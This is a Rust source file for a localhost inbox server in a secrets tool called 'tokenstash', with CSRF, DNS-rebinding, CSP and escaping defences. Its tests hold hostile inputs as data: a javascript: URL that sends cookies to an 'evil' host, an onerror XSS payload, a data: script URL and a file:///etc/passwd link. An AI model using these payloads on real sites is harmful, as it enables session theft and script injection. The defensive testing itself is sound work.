//! Localhost inbox: the human surface. One click from the notification to the vendor's page,
//! paste, submit. Binds 127.0.0.1 only. Exits after 30 idle minutes with no open tasks.
//!
//! Loopback is not authentication — see `crate::inbox_auth` for the threat model. Every route
//! except `/verify` requires the session token: presented as `?t=` on the first visit, then
//! held as an `HttpOnly; SameSite=Strict` cookie. POSTs additionally carry it in a hidden form
//! field (double submit), so a cross-site form post cannot ride the cookie into an answer.

use crate::inbox_auth;
use crate::util::App;
use anyhow::Result;
use clap::Args;
use secrecy::SecretString;
use std::collections::HashMap;
use std::io::Read;
use std::time::{Duration, Instant};
use tiny_http::{Header, Request, Response, Server};
use tokenstash_core::db::{Task, TaskKind, TaskStatus};
use tokenstash_core::tasks::{self, AnswerResult};

#[derive(Args)]
pub struct InboxArgs {
    #[arg(long)]
    pub port: Option<u16>,
    /// Never auto-exit.
    #[arg(long)]
    pub keep: bool,
}

const IDLE_EXIT: Duration = Duration::from_secs(30 * 60);

/// Cap on a form post. Answers are pasted API keys, not uploads.
const MAX_BODY: u64 = 64 * 1024;

pub fn serve(a: InboxArgs) -> Result<i32> {
    let app = App::open()?;
    let port = a.port.unwrap_or(app.cfg.inbox_port);
    // Minted here on the first ever start and reused afterwards, so a notification the human
    // has not clicked yet still opens after the inbox has idled out and been respawned.
    let tokens = inbox_auth::Tokens::ensure()?;
    let server = match Server::http(format!("127.0.0.1:{port}")) {
        Ok(s) => s,
        Err(e) => {
            // Two `ensure_inbox` racing is normal and quiet; anything else is not.
            if e.downcast_ref::<std::io::Error>().map(|io| io.kind() == std::io::ErrorKind::AddrInUse).unwrap_or(false) {
                eprintln!("inbox already running on {port}");
                return Ok(0);
            }
            eprintln!("tokenstash: cannot listen on 127.0.0.1:{port}: {e}");
            return Ok(tokenstash_core::exit::ERROR);
        }
    };
    eprintln!("tokenstash inbox → http://127.0.0.1:{port}/");
    let mut last_activity = Instant::now();
    loop {
        match server.recv_timeout(Duration::from_secs(1)) {
            Ok(Some(req)) => {
                last_activity = Instant::now();
                if let Err(e) = handle(&app, req, &tokens) {
                    eprintln!("inbox: {e:#}");
                }
            }
            Ok(None) => {
                if !a.keep && last_activity.elapsed() > IDLE_EXIT {
                    let _ = app.db.expire_overdue();
                    if app.db.list_tasks(None, true).map(|v| v.is_empty()).unwrap_or(true) {
                        return Ok(0);
                    }
                    last_activity = Instant::now();
                }
            }
            Err(e) => { eprintln!("inbox: {e}"); return Ok(1); }
        }
    }
}

fn handle(app: &App, mut req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
    use inbox_auth::Scope;
    let token = &tokens.full;
    let url = req.url().to_string();
    let (path, query) = match url.split_once('?') {
        Some((p, q)) => (p.to_string(), q.to_string()),
        None => (url.clone(), String::new()),
    };
    let q = parse_form(&query);
    let method = req.method().as_str().to_string();

    // The one unauthenticated route, and deliberately ahead of every other check: it is how a
    // CLI that has not yet decided to trust this listener asks "are you the tokenstash inbox
    // for my TOKENSTASH_HOME?" without handing over the token to find out. We answer a fresh
    // nonce with HMAC(token, nonce); a process squatting the port cannot.
    if path == "/verify" {
        return match q.get("c") {
            Some(c) if !c.is_empty() && c.len() <= inbox_auth::MAX_CHALLENGE => {
                respond(req, 200, "text/plain", inbox_auth::verify_response(token, c))
            }
            _ => not_found(req),
        };
    }

    // Defence in depth against DNS rebinding: a hostname that resolves to 127.0.0.1 carries
    // the attacker's origin (so none of our cookies), but there is no reason to serve it.
    if !host_is_loopback(&req) {
        return not_found(req);
    }

    // The cookie value is whichever token the session was opened with; its scope decides
    // what this request may do. The CSRF field must match the cookie, not merely be valid.
    let session = cookie(&req, inbox_auth::COOKIE);
    let scope = session.as_deref().and_then(|c| tokens.scope_of(c));
    let cookie_ok = scope.is_some();
    // Read one byte past the limit so "exactly at the limit" and "too long" are
    // distinguishable. Truncating instead would be worse than refusing: the CSRF field sits at
    // the front of the body, so a cut-off form still authenticates, and parse_form would hand
    // a half-copied API key or note to answer_secret as though the human had typed it.
    let mut raw = Vec::new();
    if method == "POST" {
        req.as_reader().take(MAX_BODY + 1).read_to_end(&mut raw)?;
    }
    let oversized = raw.len() as u64 > MAX_BODY;
    let body = String::from_utf8_lossy(&raw);
    let form = if method == "POST" { parse_form(&body) } else { HashMap::new() };

    // GET: the cookie alone (SameSite=Strict stops a foreign page from making the browser
    // send it). POST: the cookie AND a matching hidden field — double submit, so even a
    // bypassed or unsupported SameSite cannot turn a cross-site form post into an answer.
    let authed = match method.as_str() {
        "POST" => cookie_ok && matches!((form.get("t"), session.as_deref()), (Some(t), Some(c)) if inbox_auth::ct_eq(t, c)),
        _ => cookie_ok,
    };
    // A `?t=` on a GET: the human clicked a link from the chat (paste scope), the
    // notification or `tokenstash open` (full scope). Swap it for a cookie and bounce to a
    // clean path so the token stops appearing in the address bar, history, and Referer.
    // A full-scope cookie is never downgraded by a later paste-scope link: one
    // `tokenstash open` per browser upgrades every agent link from then on.
    if method == "GET" {
        if let Some(t) = q.get("t") {
            if let Some(presented) = tokens.scope_of(t) {
                let rest: Vec<&str> = query.split('&').filter(|kv| !kv.is_empty() && !kv.starts_with("t=")).collect();
                let dest = if rest.is_empty() { path.clone() } else { format!("{path}?{}", rest.join("&")) };
                return match (scope, presented) {
                    (Some(Scope::Full), _) => redirect(req, &dest),
                    _ => redirect_authed(req, &dest, tokens.for_scope(presented)),
                };
            }
        }
    }
    if !authed {
        return not_found(req);
    }
    let scope = scope.unwrap_or(Scope::Paste);
    // The CSRF hidden field carries the session's own token, so a paste-scope page never
    // learns the full token.
    let session_token = tokens.for_scope(scope);

    // Checked after authentication so an unauthenticated caller still learns nothing (it gets
    // the same bare 404 as everything else), and before any task lookup so nothing is stored.
    if oversized {
        return respond(req, 413, "text/plain", "answer too large; nothing was stored".into());
    }

    app.db.expire_overdue()?;

    if path == "/" {
        let list = app.db.list_tasks(None, true)?;
        let flash = q.get("m").cloned();
        return respond(req, 200, "text/html; charset=utf-8", page_index(&list, flash.as_deref()));
    }
    if let Some(id) = path.strip_prefix("/t/") {
        let id = id.trim_end_matches('/').to_string();
        // An ambiguous prefix is an error from the lookup; to the browser it is a 404, not a
        // dropped connection.
        let Ok(Some(task)) = app.db.find_task(&id) else { return respond(req, 404, "text/plain", "no such task".into()) };
        if method == "GET" {
            return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, session_token, scope, &app.cfg.env_file));
        }
        if method == "POST" {
            let action = form.get("action").cloned().unwrap_or_default();
            let ctx = app.ctx();
            let msg: Result<String> = (|| {
                match (task.kind.clone(), action.as_str()) {
                    (kind, "deny") => {
                        // The paste session is not tied to a directory, so from it "deny" on an
                        // approval card could close another project's pairing for a day.
                        if kind == TaskKind::Approval && scope != Scope::Full {
                            anyhow::bail!("closing an approval card needs the full inbox session: click the desktop notification or run `tokenstash open`, then reload this page");
                        }
                        tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?;
                        Ok(format!("Denied {}", task.title))
                    }
                    (TaskKind::Secret, _) => {
                        // A paste other directories will receive (a Replace card; a key they
                        // hold a grant for) is a decision about them — the agent's link may not
                        // make it.
                        if scope != Scope::Full && tasks::fans_out(&ctx, &task)? {
                            anyhow::bail!("other directories hold this key, so the paste would reach them too: open this card from the desktop notification or run `tokenstash open`");
                        }
                        let v = form.get("value").cloned().unwrap_or_default();
                        let v = v.trim().to_string();
                        if v.is_empty() { anyhow::bail!("empty value"); }
                        let skip = form.contains_key("skip_check");
                        match tasks::answer_secret(&ctx, &task, SecretString::from(v), skip)? {
                            AnswerResult::Stored { injected_to, rotation, .. } => {
                                let mut m = format!("Stored {} and wrote it to {}", task.name.clone().unwrap_or_default(), injected_to.map(|p| p.display().to_string()).unwrap_or_else(|| "the stash".into()));
                                if let Some(r) = rotation {
                                    if !r.rewritten.is_empty() { m.push_str(&format!("; also updated {} other project(s)", r.rewritten.len())); }
                                    if !r.skipped.is_empty() { m.push_str(&format!("; {} project(s) STILL HOLD THE OLD VALUE ({}) — fix before revoking it", r.skipped.len(), r.skipped.iter().map(|(p, _)| tokenstash_core::project::short(std::path::Path::new(p))).collect::<Vec<_>>().join(", "))); }
                                }
                                Ok(m)
                            }
                            _ => Ok("stored".into()),
                        }
                    }
                    (TaskKind::Approval, _) => {
                        // Approving is the one thing a paste-scope session must not do: it is
                        // the human's yes to "this project may use my key", and the agent's
                        // link must not be able to give it. Refuse with no state change.
                        if scope != Scope::Full {
                            anyhow::bail!("approving needs the full inbox session: click the desktop notification or run `tokenstash open`, then reload this page");
                        }
                        let decision = match action.as_str() { "allow" => tasks::Decision::Allow, "allow_broad" => tasks::Decision::AllowBroad, _ => tasks::Decision::Deny };
                        // What the page listed when it was rendered: a card that grew since
                        // (an agent asked for more) is refused and re-read.
                        // The browser form always carries `seen`; a POST without it (a
                        // person scripting `curl`) is judged on the card as it is now.
                        let seen: Option<Vec<String>> = form.get("seen").map(|s| s.split(',').filter(|x| !x.is_empty()).map(String::from).collect());
                        match tasks::answer_approval(&ctx, &task, decision, seen.as_deref())? {
                            AnswerResult::Approved { injected, replaced } => Ok(format!("Approved; injected {}{}", if injected.is_empty() { "nothing new".into() } else { injected.join(", ") }, if replaced.is_empty() { String::new() } else { format!(". {} rejected by the provider at delivery — a Replace card is waiting", replaced.join(", ")) })),
                            _ => Ok("Denied".into()),
                        }
                    }
                    (TaskKind::Human, _) => { tasks::answer_human(&ctx, &task, form.get("note").map(|s| s.as_str()).filter(|s| !s.is_empty()))?; Ok(format!("Done: {}", task.title)) }
                }
            })();
            return match msg {
                Ok(m) => redirect(req, &format!("/?m={}", urlencoding::encode(&m))),
                Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), session_token, scope, &app.cfg.env_file)),
            };
        }
    }
    not_found(req)
}

/// Anything the caller is not authorised for looks like nothing at all: bare 404, empty body.
/// A local process or a foreign page probing the port learns neither that an inbox is here nor
/// that a given task id exists.
fn not_found(req: Request) -> Result<()> {
    let r = Response::from_string("")
        .with_status_code(404)
        .with_header(Header::from_bytes("Cache-Control", "no-store").unwrap());
    req.respond(r)?;
    Ok(())
}

fn header<'a>(req: &'a Request, name: &'static str) -> Option<&'a str> {
    req.headers().iter().find(|h| h.field.equiv(name)).map(|h| h.value.as_str())
}

fn cookie(req: &Request, name: &'static str) -> Option<String> {
    header(req, "Cookie")?.split(';').find_map(|kv| {
        let (k, v) = kv.split_once('=')?;
        (k.trim() == name).then(|| v.trim().to_string())
    })
}

fn host_is_loopback(req: &Request) -> bool {
    let Some(v) = header(req, "Host") else { return false };
    let host = match v.strip_prefix('[') {
        Some(rest) => rest.split(']').next().unwrap_or_default(), // [::1]:7433
        None => v.split(':').next().unwrap_or_default(),          // 127.0.0.1:7433
    };
    matches!(host, "127.0.0.1" | "localhost" | "::1")
}

fn respond(req: Request, code: u16, ctype: &str, body: String) -> Result<()> {
    let r = Response::from_string(body)
        .with_status_code(code)
        .with_header(Header::from_bytes("Content-Type", ctype).unwrap())
        .with_header(Header::from_bytes("Cache-Control", "no-store").unwrap())
        .with_header(Header::from_bytes("X-Frame-Options", "DENY").unwrap())
        // The pages are self-contained: one inline <style>, no script, no image, no fetch.
        // Saying so stops a link or a field that got past the escaping upstream from
        // running anything in this origin — the origin whose session approves grants.
        .with_header(Header::from_bytes("Content-Security-Policy",
            "default-src 'none'; style-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'").unwrap())
        .with_header(Header::from_bytes("Referrer-Policy", "no-referrer").unwrap());
    req.respond(r)?;
    Ok(())
}

/// 303 that also installs the session cookie. No `Secure` attribute: this is plain HTTP on the
/// loopback interface and `Secure` would make the browser drop the cookie outright. No
/// `Max-Age` either — it dies with the browser session.
fn redirect_authed(req: Request, to: &str, token: &str) -> Result<()> {
    let set_cookie = format!("{}={token}; Path=/; HttpOnly; SameSite=Strict", inbox_auth::COOKIE);
    let r = Response::from_string("")
        .with_status_code(303)
        .with_header(Header::from_bytes("Location", to).unwrap())
        .with_header(Header::from_bytes("Set-Cookie", set_cookie.as_str()).unwrap())
        .with_header(Header::from_bytes("Cache-Control", "no-store").unwrap());
    req.respond(r)?;
    Ok(())
}

fn redirect(req: Request, to: &str) -> Result<()> {
    let r = Response::from_string("").with_status_code(303).with_header(Header::from_bytes("Location", to).unwrap());
    req.respond(r)?;
    Ok(())
}

fn parse_form(s: &str) -> HashMap<String, String> {
    s.split('&')
        .filter_map(|kv| {
            let (k, v) = kv.split_once('=')?;
            let dec = |x: &str| urlencoding::decode(&x.replace('+', " ")).map(|c| c.into_owned()).unwrap_or_default();
            Some((dec(k), dec(v)))
        })
        .collect()
}

fn esc(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;").replace('\'', "&#39;")
}

const CSS: &str = r#"
:root{color-scheme:light dark;--fg:#111;--bg:#fff;--mut:#666;--line:#e5e5e5;--acc:#2563eb;--ok:#16a34a;--bad:#dc2626}
@media(prefers-color-scheme:dark){:root{--fg:#eee;--bg:#111;--mut:#999;--line:#2a2a2a}}
*{box-sizing:border-box}body{margin:0;font:15px/1.5 system-ui,-apple-system,sans-serif;color:var(--fg);background:var(--bg)}
main{max-width:640px;margin:0 auto;padding:32px 20px}h1{font-size:18px;margin:0 0 20px}h2{font-size:20px;margin:0 0 6px}
.card{border:1px solid var(--line);border-radius:10px;padding:18px;margin:0 0 14px}.mut{color:var(--mut);font-size:13px}
a.btn,button{display:inline-block;padding:9px 14px;border-radius:8px;border:1px solid var(--line);background:transparent;color:var(--fg);font:inherit;cursor:pointer;text-decoration:none}
button.p,a.btn.p{background:var(--acc);border-color:var(--acc);color:#fff}button.bad{border-color:var(--bad);color:var(--bad)}
input[type=password],input[type=text],textarea{width:100%;padding:10px;border:1px solid var(--line);border-radius:8px;background:transparent;color:var(--fg);font:inherit}
ol{padding-left:20px}.row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:12px}.flash{background:color-mix(in srgb,var(--ok) 12%,transparent);border:1px solid var(--ok);padding:10px 14px;border-radius:8px;margin-bottom:16px}
.err{background:color-mix(in srgb,var(--bad) 12%,transparent);border:1px solid var(--bad);padding:10px 14px;border-radius:8px;margin-bottom:16px}code{font-size:13px}
"#;

fn layout(title: &str, body: String) -> String {
    format!("<!doctype html><html><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=referrer content=no-referrer><title>{} · tokenstash</title><style>{CSS}</style></head><body><main><h1>tokenstash inbox</h1>{body}</main></body></html>", esc(title))
}

fn page_index(list: &[Task], flash: Option<&str>) -> String {
    let mut b = String::new();
    if let Some(f) = flash {
        b.push_str(&format!("<div class=flash>✓ {}</div>", esc(f)));
    }
    if list.is_empty() {
        b.push_str("<p class=mut>No open tasks. Your agents have everything they need.</p>");
    }
    for t in list {
        let what = match t.kind {
            TaskKind::Secret => format!("<code>{}</code>", esc(&t.name.clone().unwrap_or_default())),
            TaskKind::Approval => format!("approve {}", esc(&crate::util::approval_names(&t.names).join(", "))),
            TaskKind::Human => esc(&t.title),
        };
        b.push_str(&format!(
            "<div class=card><div class=mut>{} · {}</div><h2>{}</h2><div class=mut>{}</div><div class=row><a class='btn p' href='/t/{}'>Open →</a></div></div>",
            esc(&tokenstash_core::project::short(std::path::Path::new(&t.project))), esc(&t.agent), what, esc(&t.title), t.id
        ));
    }
    layout("Inbox", b)
}

/// The second half of the double submit. A hidden field rather than a header because these
/// are plain HTML forms with no JavaScript.
fn csrf_field(token: &str) -> String {
    format!("<input type=hidden name=t value=\"{}\">", esc(token))
}

fn page_task(t: &Task, err: Option<&str>, token: &str, scope: inbox_auth::Scope, env_file: &str) -> String {
    let csrf = csrf_field(token);
    let mut b = String::new();
    b.push_str("<p><a href='/'>← all tasks</a></p>");
    if let Some(e) = err {
        b.push_str(&format!("<div class=err>{}</div>", esc(e)));
    }
    b.push_str(&format!("<div class=card><div class=mut>{} · requested by {}</div><h2>{}</h2>", esc(&tokenstash_core::project::short(std::path::Path::new(&t.project))), esc(&t.agent), esc(&t.title)));
    if let Some(w) = &t.why { b.push_str(&format!("<p>{}</p>", esc(w))); }
    // Second gate on the scheme (tasks::clean_url is the first): this is the one place a
    // card's text becomes something the human clicks, so it does not inherit trust from the
    // layer that stored it. A link that is not http(s) is simply not rendered as a link.
    if let Some(u) = t.url.as_deref().filter(|u| { let l = u.to_ascii_lowercase(); l.starts_with("https://") || l.starts_with("http://") }) {
        // The label is the host alone: `https://openai.com@evil.example/` must read as
        // evil.example, not as openai.com.
        let host = u.split_once("//").map(|(_, r)| r).unwrap_or(u).split('/').next().unwrap_or(u);
        let host = host.rsplit('@').next().unwrap_or(host);
        b.push_str(&format!("<div class=row><a class='btn p' href='{0}' target=_blank rel='noopener noreferrer'>Open {1} ↗</a></div>", esc(u), esc(host)));
    }
    if !t.steps.is_empty() {
        b.push_str("<ol>");
        for s in &t.steps { b.push_str(&format!("<li>{}</li>", esc(s))); }
        b.push_str("</ol>");
    }
    if t.status != TaskStatus::Pending {
        b.push_str(&format!("<p class=mut>This task is {}.</p></div>", t.status.as_str()));
        return layout(&t.title, b);
    }
    match t.kind {
        TaskKind::Secret => {
            b.push_str(&format!(
                "<form method=post autocomplete=off>{csrf}<label class=mut for=v>{}</label><input id=v type=password name=value autocomplete=off autofocus placeholder='paste here — never shown, never sent anywhere but your keychain'>{}<label class=mut style='display:block;margin-top:8px'><input type=checkbox name=skip_check value=1> skip the provider check (store even if it cannot be verified)</label><div class=row><button class=p type=submit>Store &amp; inject</button><button class=bad name=action value=deny formnovalidate>Decline</button></div></form>",
                esc(&t.name.clone().unwrap_or_default()),
                t.pattern.as_ref().map(|p| format!("<div class=mut>must match <code>{}</code></div>", esc(p))).unwrap_or_default()
            ));
        }
        TaskKind::Approval => {
            // Rule 12: the card shows the canonical path, what kind of decision this is,
            // the exact destination file, and every key with its identity and sensitivity.
            let kind = match t.expects.as_str() { tasks::APPROVAL_PAIRING => "new directory — first stored keys", tasks::APPROVAL_SENSITIVE => "sensitive / unregistered keys — each its own decision", tasks::APPROVAL_ONCE => "chosen by a running program — this run only", _ => "approval" };
            b.push_str(&format!("<p class=mut>Directory: <code>{}</code><br>Decision: {}<br>Written to: <code>{}</code></p>", esc(&t.project), esc(kind), esc(&std::path::Path::new(&t.project).join(env_file).display().to_string())));
            let rows: Vec<String> = t.names.iter().filter(|n| n.as_str() != "*").map(|entry| {
                let (n, identity) = tasks::split_identity(entry);
                let sensitive = tokenstash_core::registry::lookup(n).map(|p| p.sensitive).unwrap_or(false) || tokenstash_core::registry::lookup(n).is_none();
                format!("<li><code>{}</code>{}{}</li>", esc(n), if identity != "default" { format!(" <span class=mut>@{}</span>", esc(identity)) } else { String::new() }, if sensitive { " <span class=err>sensitive</span>" } else { "" })
            }).collect();
            b.push_str(&format!("<ul>{}</ul>", rows.join("")));
            if scope == inbox_auth::Scope::Full {
                let broad = if t.expects == tasks::APPROVAL_PAIRING {
                    "<button name=action value=allow_broad title='also any registry-confirmed non-sensitive key for this identity, in this directory only'>Allow these + any non-sensitive key here</button>"
                } else { "" };
                let seen = esc(&t.names.join(","));
                b.push_str(&format!("<form method=post>{csrf}<input type=hidden name=seen value='{seen}'><div class=row><button class=p name=action value=allow>Allow these</button>{broad}<button class=bad name=action value=deny>Deny</button></div></form>"));
            } else {
                b.push_str("<div class=err>Approving needs the full inbox session, which only you can open: click the desktop notification, or run <code>tokenstash open</code> in a terminal, then reload this page. (The link your agent gave you can paste keys, but not approve — so an agent can never approve its own request.)</div>");
            }
        }
        TaskKind::Human => {
            let note = if t.expects == "text" {
                "<textarea name=note rows=3 placeholder='your answer'></textarea><div class=mut>This answer is sent back to the agent. Never paste a secret here — the agent should request secrets with <code>tokenstash need</code>.</div>"
            } else {
                "<input type=text name=note placeholder='optional note (shown to the agent)'>"
            };
            b.push_str(&format!("<form method=post>{csrf}{note}<div class=row><button class=p name=action value=done>Done</button><button class=bad name=action value=deny>Can't do this</button></div></form>"));
        }
    }
    b.push_str("</div>");
    layout(&t.title, b)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn csrf_field_carries_the_token_and_escapes_it() {
        assert_eq!(csrf_field("abc123"), "<input type=hidden name=t value=\"abc123\">");
        // The token is hex so this cannot happen, but the field must never be an injection point.
        assert_eq!(csrf_field("\"><script>"), "<input type=hidden name=t value=\"&quot;&gt;&lt;script&gt;\">");
    }

    fn card(url: Option<&str>, why: &str) -> Task {
        Task {
            id: "t_abc123".into(), kind: TaskKind::Secret, project: "/tmp/p".into(), agent: "agent".into(),
            name: Some("OPENAI_API_KEY".into()), identity: "default".into(), title: "OpenAI API key".into(),
            why: Some(why.into()), url: url.map(String::from), steps: vec![],
            expects: "secret".into(), pattern: None, names: vec![], status: TaskStatus::Pending,
            created: "2026-01-01T00:00:00Z".into(), deadline: "2099-01-01T00:00:00Z".into(),
            answered_at: None, note: None,
        }
    }

    /// The card's link is the one thing on the page the human clicks. A `javascript:` URL
    /// there would run in the inbox's own origin — the origin whose session approves grants.
    #[test]
    fn a_card_link_is_rendered_only_for_http_schemes() {
        for bad in ["javascript:fetch('//evil/'+document.cookie)", "data:text/html,<script>x</script>", "file:///etc/passwd", "JavaScript:alert(1)"] {
            let page = page_task(&card(Some(bad), "why"), None, "tok", inbox_auth::Scope::Full, ".env.local");
            assert!(!page.contains("href='javascript"), "{bad}: {page}");
            assert!(!page.to_lowercase().contains("javascript:"), "{bad}");
            assert!(!page.contains("data:text/html"), "{bad}");
            assert!(!page.contains("Open "), "no link button at all for {bad}");
        }
        let page = page_task(&card(Some("https://platform.openai.com/api-keys"), "why"), None, "tok", inbox_auth::Scope::Full, ".env.local");
        assert!(page.contains("href='https://platform.openai.com/api-keys'"), "{page}");
        assert!(page.contains("Open platform.openai.com"), "the host is what the human reads: {page}");
    }

    /// Agent-written text is escaped wherever it lands on the page.
    #[test]
    fn agent_written_card_text_cannot_become_markup() {
        let page = page_task(&card(None, "<img src=x onerror=alert(1)>\"'"), None, "tok", inbox_auth::Scope::Full, ".env.local");
        assert!(!page.contains("<img src=x"), "{page}");
        assert!(page.contains("&lt;img src=x onerror=alert(1)&gt;"), "{page}");
    }

    #[test]
    fn parse_form_reads_the_csrf_field_out_of_a_body() {
        let f = parse_form("value=sk-abc&t=deadbeef&skip_check=1");
        assert_eq!(f.get("t").map(String::as_str), Some("deadbeef"));
        assert_eq!(f.get("value").map(String::as_str), Some("sk-abc"));
        // A body with no token at all authenticates nothing.
        assert!(!parse_form("value=sk-abc").contains_key("t"));
    }
}
